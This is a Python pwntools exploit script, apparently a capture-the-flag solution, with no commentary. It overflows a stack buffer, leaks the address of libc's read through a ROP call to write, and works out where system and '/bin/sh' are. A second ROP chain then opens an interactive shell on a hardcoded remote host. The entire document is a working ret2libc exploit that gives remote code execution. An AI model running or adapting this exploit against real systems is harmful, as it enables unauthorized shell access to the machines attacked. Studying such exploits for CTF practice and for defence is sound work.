from pwn import*

elf=ELF("./pwn")    #offset 0x88

local=0
if local:
    libc=ELF("./libc-2.27.so")
    p=process("./pwn")
    gdb.attach(proc.pidof(p)[0])
else:
    p=remote("118.89.138.44",30010)
    libc=ELF("./libc-2.19.so")
    
context.log_level="debug"
rop=0x40056a   #rdi rsi rdx

payload='A'*0x88
payload+=p64(rop)
payload+=p64(1)
payload+=p64(elf.got['read'])  
payload+=p64(8)
payload+=p64(elf.plt['write'])
payload+=p64(elf.symbols['here'])   #leak read address

p.sendline(payload)
read_addr=u64(p.recv(8))

sys_addr=libc.symbols['system']+read_addr-libc.symbols['read']
sh_addr=libc.search('/bin/sh').next()+read_addr-libc.symbols['read']

payload='A'*0x88
payload+=p64(rop)
payload+=p64(sh_addr)
payload+=p64(0)
payload+=p64(0)
payload+=p64(sys_addr)

p.sendline(payload)
p.interactive()
